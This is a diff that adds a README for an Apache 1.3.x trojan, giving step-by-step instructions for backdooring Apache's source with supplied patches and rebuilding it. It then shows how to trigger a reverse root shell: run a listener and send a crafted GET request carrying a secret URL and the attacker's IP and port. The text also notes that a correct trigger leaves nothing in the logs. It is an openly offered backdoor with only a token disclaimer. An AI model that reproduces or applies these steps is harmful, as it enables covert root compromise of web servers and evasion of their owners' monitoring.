@@ -1,0 +1,60 @@
+
+APACHE 1.3.17-19 Trojan - Remote root backdoor
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Tested on that versions, 1.3.17 and 1.3.19, also tested on 1.3.12 but
+with errors, the patch for http_core.c will not be applied, and an error 
+line in errors_log file will appear. (grep it or change the diff) and the
+variables are in bad position, so you need to touch a bit the file.
+(exercise to the reader)
+
+first.diff is for http_protocol.c
+second.diff is for http_core.c
+
+Edit the trojan.h and change the values to your pleasure..
+
+
+Basically, you do this..
+
+get the version of apache you want (sources), tar zxvf it.. copy these
+files (*.diff and trojan.h) to <path>/src/main
+
+patch -p0 < first.diff http_protocol.c
+patch -p0 < second.diff http_core.c
+
+Then.. make it with the correct values in configure.. (like prefix, 
+modules, etc...)
+
+And you are done... to get the root you do
+
+On localhost:
+./simple <port you want> - ex: ./simple 8888
+
+On localhost:
+
+telnet <victim> 80
+GET <EVIL_URL><your ip>:PORT
+ex:
+GET /i/want/root/now200.41.24.50:8888
+
+Then switch to the console where you run simple.c and you will get your
+rootshell.
+
+EVIL_URL is defined on trojan.h is a path like: /i/want/root/now
+
+
+btw, nothing will be logged if the url is correct, and *REMEMBER* only
+IP *NOT* *HOSTNAME*!!.. ill segfault if you put a hostname coz i dont
+coded a 'resolver' function :) - add it if you want
+
+Greets to ka0z, dn0, bruj0
+       #flatline
+       
+- for demostrative proposes only!#@$ 
+- dont abuse :)
+
+venomous
+venomous@rdcrew.com.ar
+http://www.rdcrew.com.ar
+
+
